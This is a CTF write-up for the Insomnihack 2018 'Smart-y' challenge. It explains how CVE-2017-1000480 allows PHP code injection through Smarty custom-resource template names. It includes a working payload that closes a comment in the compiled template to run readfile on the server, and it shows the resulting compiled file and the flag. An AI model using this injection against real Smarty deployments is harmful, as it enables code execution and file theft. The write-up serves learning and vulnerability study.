---
layout: post
title: Smart-y writeup, Insomnihack 2018 teaser
---

This challenge is the kind I really like - a little #0day crafting involved. The following is an exploit for CVE-2017-1000480 by virtue of this CTF. The chal was found at [http://smart-y.teaser.insomnihack.ch/](http://smart-y.teaser.insomnihack.ch/). After a couple of UI interactions we end up at `http://smart-y.teaser.insomnihack.ch/console.php` showing the following content:

```
The news system is in maintenance. Please wait a year. <<<DEBUG>>>
```

`<<<DEBUG>>>` is a link that redirects to `http://smart-y.teaser.insomnihack.ch/console.php?hl` which displays its source code:

```php

<?php 

if(isset($_GET['hl'])){ highlight_file(__FILE__); exit; } 
include_once('./smarty/libs/Smarty.class.php'); 
define('SMARTY_COMPILE_DIR','/tmp/templates_c'); 
define('SMARTY_CACHE_DIR','/tmp/cache'); 
  
  
class news extends Smarty_Resource_Custom 
{ 
    protected function fetch($name,&$source,&$mtime) 
    { 
        $template = "The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>".htmlspecialchars("<<<DEBUG>>>")."</a>"; 
        $source = $template; 
        $mtime = time(); 
    } 
} 
  
// Smarty configuration 
$smarty = new Smarty(); 
$my_security_policy = new Smarty_Security($smarty); 
$my_security_policy->php_functions = null; 
$my_security_policy->php_handling = Smarty::PHP_REMOVE; 
$my_security_policy->modifiers = array(); 
$smarty->enableSecurity($my_security_policy); 
$smarty->setCacheDir(SMARTY_CACHE_DIR); 
$smarty->setCompileDir(SMARTY_COMPILE_DIR); 


$smarty->registerResource('news',new news); 
$smarty->display('news:'.(isset($_GET['id']) ? $_GET['id'] : ''));  

```

By gazing at this we note the following:

- the code uses the Smarty template library
- the code does not use a template file but rather ...
- it registers a custom resource which works as a dynamic template
- we completely control `$_GET['id']` which is being passed into the `display()` method
- `./smarty/libs/Smarty.class.php` include path is actually browsable (directory listing)

Beyond that the challenge description suggests that the flag is in `/flag`. From the last point we learn about the version of the template engine which is ... `===== 3.1.31 ===== (14.12.2016)` as per the [change_log.txt](http://smart-y.teaser.insomnihack.ch/smarty/change_log.txt) file discovered. In order to see how outdated this is we take to the [Smarty project](https://github.com/smarty-php/smarty/) over at GH. There's quite a few thousand commits after the date.

Quick parsing of issues and commits does not reveal anything interesting so we conduct a quick CVE search to see if there are known vulnerabilities. Curiously, we do find one: [CVE-2017-1000480](https://www.cvedetails.com/cve/CVE-2017-1000480/) which happens to be the latest one reported on 2018-01-03. The description is extremely interesting:

```

Smarty 3 before 3.1.32 is vulnerable to a PHP code injection when calling fetch() or display() functions on custom resources that does not sanitize template name.

```

Welp...  we have just that. The CVE details point only to the latest [changelog](https://github.com/smarty-php/smarty/blob/master/change_log.txt) where we [find our bug-o](https://github.com/smarty-php/smarty/blob/master/change_log.txt#L70):

```

21.7.2017
  - security possible PHP code injection on custom resources at display() or fetch()
    calls if the resource does not sanitize the template name

```

which, after parsing the commit history, leads us to [this commit](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61). Looks like it's what we're after. The commit is tiny (typical to terrbile vuln bugfixes) but contains key pointers that help us craft a sploit. `$source->name` is apparently a thing that's causing troubles when using a custom resource via `$smarty->registerResource('news',new news);`.

So basically the `$_GET['id']` param is `$source->name` which we fully control. After *vardumping* a bit around the patched functions in the Smarty library we see that we can contaminate the file path that's being generated [here](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61#diff-c18c361cf06b21f46e6d5ae3d3330a2fR50), which in turn, ends up [here](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61#diff-9d91242f09631bf41fcbb63ad9c00fa3R45). So what's happening at a higher level is that Smarty would compile the template and cache it under `/tmp/templates_c` (referring to `define('SMARTY_COMPILE_DIR','/tmp/templates_c');` of the challenge code) bearing the path name that we were able to taint.

If you carefully take a look at the patch again you'd see that something weird [here](https://github.com/smarty-php/smarty/commit/614ad1f8b9b00086efc123e49b7bb8efbfa81b61#diff-9d91242f09631bf41fcbb63ad9c00fa3R4) as if it prevents a PHP comment from being parsed as such. If so then it's code exec indeed. The sploit is trivial and looks like this:

```

http://smart-y.teaser.insomnihack.ch/console.php?id=*/readfile(%22/flag%22);//

```

Our payload is being parsed as `news:*/readfile(%22/flag%22);//` which creates a file `/tmp/templates_c/<hash of the file>_<some digits>_<our tainted name>.php` which contains the following (can be fetched from `http://smart-y.teaser.insomnihack.ch/console.php?id=*/readfile(__FILE__);//`):

```


<?php
/* Smarty version 3.1.31, created on 2018-01-22 09:51:34
  from "news:*/readfile(__FILE__);//" */

/* @var Smarty_Internal_Template $_smarty_tpl */
if ($_smarty_tpl->_decodeProperties($_smarty_tpl, array (
  'version' => '3.1.31',
  'unifunc' => 'content_5a65b426cbc824_91081900',
  'has_nocache_code' => false,
  'file_dependency' => 
  array (
    '982ed2594de5de4cbe51900d54016762d8808622' => 
    array (
      0 => 'news:*/readfile(__FILE__);//',
      1 => 1516614694,
      2 => 'news',
    ),
  ),
  'includes' => 
  array (
  ),
),false)) {
function content_5a65b426cbc824_91081900 (Smarty_Internal_Template $_smarty_tpl) {
?>
The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>&lt;&lt;&lt;DEBUG&gt;&gt;&gt;</a><?php }
}
The news system is in maintenance. Please wait a year. <a href='/console.php?hl'>&lt;&lt;&lt;DEBUG&gt;&gt;&gt;</a>

```

As you can see our `$_GET['id']` ends up in the template source where we simply close the comment line and append our code. Flag:

`INS{why_being_so_smart-y} The news system is in maintenance. Please wait a year. <<<DEBUG>>>`

> Read the manual if unsure, post comment(s) if unclear.
